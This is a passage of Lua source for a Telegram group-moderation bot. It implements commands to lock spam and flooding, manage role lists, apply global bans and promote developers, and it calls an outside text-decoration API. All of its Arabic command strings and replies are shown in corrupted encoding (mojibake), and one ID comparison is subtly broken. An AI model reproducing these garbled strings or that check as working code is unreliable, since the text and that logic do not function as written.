Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Spam"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then 
database:hset(bot_id.."Tshake:flooding:settings:"..msg.chat_id_ ,"flood","kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±" and Addictive(msg) then 
database:hset(bot_id.."Tshake:flooding:settings:"..msg.chat_id_ ,"flood","del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ­Ψ°Ω")
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then 
database:hset(bot_id.."Tshake:flooding:settings:"..msg.chat_id_ ,"flood","keed")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then 
database:hset(bot_id.."Tshake:flooding:settings:"..msg.chat_id_ ,"flood","mute")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±" and Addictive(msg) then 
database:hdel(bot_id.."Tshake:flooding:settings:"..msg.chat_id_ ,"flood")  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")
return false
end 

if text == ("ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω") and DevTshake(msg) then
database:del(bot_id.."Tshake:GBan:User")
send(msg.chat_id_, msg.id_, "\nπ βΏΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω")
return false
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ") and DevTshake(msg) then
database:del(bot_id.."Tshake:Sudo:User")
send(msg.chat_id_, msg.id_, "\nπ βΏ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ·ΩΨ±ΩΩ  ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ" and DevBot(msg) then
database:del(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_)
texts = "ββΏ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ"
send(msg.chat_id_, msg.id_, texts)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ" and BasicConstructor(msg) then
database:del(bot_id.."Tshake:Constructor"..msg.chat_id_)
texts = "ββΏ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ "
send(msg.chat_id_, msg.id_, texts)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘" and Constructor(msg) then
database:del(bot_id.."Tshake:Manager"..msg.chat_id_)
texts = "ββΏ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ "
send(msg.chat_id_, msg.id_, texts)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ" and Owner(msg) then
database:del(bot_id.."Tshake:Mod:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "πβΏ ΨͺΩ ΩΨ³Ψ­  ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§Ψ―ΩΩΩΨ©  ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Special:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "πβΏ ΨͺΩ ΩΨ³Ψ­  ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΩΩΨ²ΩΩ  ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨͺΩΩΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Muted:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "πβΏ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨͺΩΩΩΩ ")
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Ban:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "\nπ·βΏΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ")
end
if text == ("ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω") and DevTshake(msg) then
local list = database:smembers(bot_id.."Tshake:GBan:User")
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("Ψ§ΩΩΨ·ΩΨ±ΩΩ") and DevTshake(msg) then
local list = database:smembers(bot_id.."Tshake:Sudo:User")
t = "\nββΏΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ¨ΩΨͺ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΨ±ΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ" and DevBot(msg) then
local list = database:smembers(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_)
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ Ψ§Ψ³Ψ§Ψ³ΩΩΩ"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") and BasicConstructor(msg) then
local list = database:smembers(bot_id.."Tshake:Constructor"..msg.chat_id_)
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘") and Constructor(msg) then
local list = database:smembers(bot_id.."Tshake:Manager"..msg.chat_id_)
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ―Ψ±Ψ§Ψ‘"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("Ψ§ΩΨ§Ψ―ΩΩΩΩ") and Owner(msg) then
local list = database:smembers(bot_id.."Tshake:Mod:User"..msg.chat_id_)
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§Ψ―ΩΩΩΩ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ" then
   send(msg.chat_id_, msg.id_, ' β ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ')
   database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"close")
   end
   if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ" then
   send(msg.chat_id_, msg.id_,' β ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ')
   database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"open")
   end
   if text and text:match("^Ψ²Ψ?Ψ±ΩΩ (.*)$") and database:get(bot_id.." sofi:zhrf_Bots"..msg.chat_id_) == "open" then
   local TextZhrfa = text:match("^Ψ²Ψ?Ψ±ΩΩ (.*)$")
   zh = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZhrfa)..'')
   zx = JSON.decode(zh)
   t = "\n βΩΨ§Ψ¦ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ \nβ©ββββββ©β©ββββββ©\n"
   i = 0
   for k,v in pairs(zx.ok) do
   i = i + 1
   t = t..i.."-  `"..v.."` \n"
   end
   send(msg.chat_id_, msg.id_, t..'β©ββββββ©β©ββββββ©\nΨ§ΨΆΨΊΨ· ΨΉΩΩ Ψ§ΩΨ§Ψ³Ω ΩΩΨͺΩ ΩΨ³Ψ?Ω\nβ©ββββββ©πβ©ββββββ©Ω΄\n β β²[π’πππ](t.me/Soon_ban)β³ β ')
   end
if text == ("Ψ§ΩΩΩΩΨ²ΩΩ") and Addictive(msg) then
local list = database:smembers(bot_id.."Tshake:Special:User"..msg.chat_id_)
t = "\nββΏΩΨ§Ψ¦ΩΨ© ΩΩΩΨ²ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ²ΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("Ψ§ΩΩΩΨͺΩΩΩΩ") and Addictive(msg) then
local list = database:smembers(bot_id.."Tshake:Muted:User"..msg.chat_id_)
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨͺΩΩΩΩ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΩΨͺΩΩΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ") and Addictive(msg) then
local list = database:smembers(bot_id.."Tshake:Ban:User"..msg.chat_id_)
t = "\nββΏΩΨ§Ψ¦ΩΨ© ΩΨ­ΨΈΩΨ±ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ­ΨΈΨ± ΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and DevTshake(msg) then
function Function_Tshake(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "π βΏΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
database:sadd(bot_id.."Tshake:GBan:User", result.sender_user_id_)
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω @(.*)$")  and DevTshake(msg) then
local username = text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "π βΏΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
database:sadd(bot_id.."Tshake:GBan:User", result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω (%d+)$") and DevTshake(msg) then
local userid = text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω (%d+)$")
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "π βΏΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
database:sadd(bot_id.."Tshake:GBan:User", userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ")  
return false
end
if text == ("Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and DevTshake(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:GBan:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω @(.*)$") and DevTshake(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ")  
database:srem(bot_id.."Tshake:GBan:User", result.id_)
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω (%d+)$") and DevTshake(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω (%d+)$")
database:srem(bot_id.."Tshake:GBan:User", userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ")  
return false
end

if text == ("Ψ±ΩΨΉ ΩΨ·ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and DevTshake(msg) then
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Sudo:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± @(.*)$") and DevTshake(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Sudo:User", result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± (%d+)$") and DevTshake(msg) then
local userid = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± (%d+)$")
database:sadd(bot_id.."Tshake:Sudo:User", userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
return false 
end
if text == ("Ψ­Ψ°Ω ΩΨ·ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and DevTshake(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Sudo:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ±ΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ­Ψ°Ω ΩΨ·ΩΨ± @(.*)$") and DevTshake(msg) then
local username = text:match("^Ψ­Ψ°Ω ΩΨ·ΩΨ± @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Sudo:User", result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ±ΩΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end  
if text and text:match("^Ψ­Ψ°Ω ΩΨ·ΩΨ± (%d+)$") and DevTshake(msg) then
local userid = text:match("^Ψ­Ψ°Ω ΩΨ·ΩΨ± (%d+)$")
database:srem(bot_id.."Tshake:Sudo:User", userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ±ΩΩ")  
return false 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 

function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Basic:Constructor23"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ§ΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ @(.*)$") and DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Basic:Constructor23"..msg.chat_id_, result.id_)

Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
end,nil)   
end

if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΨ§Ω ')
database:set(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:tshake:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:tshake:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:tshake:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"ΨͺΩ Ψ­Ψ°Ω Ψ§ΩΨ±Ψ― ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω")
database:del(bot_id..'botss:tshake:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:tshake:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:tshake:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:tshake:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:tshake:List:Rd:Sudo", text)
return false
end
end
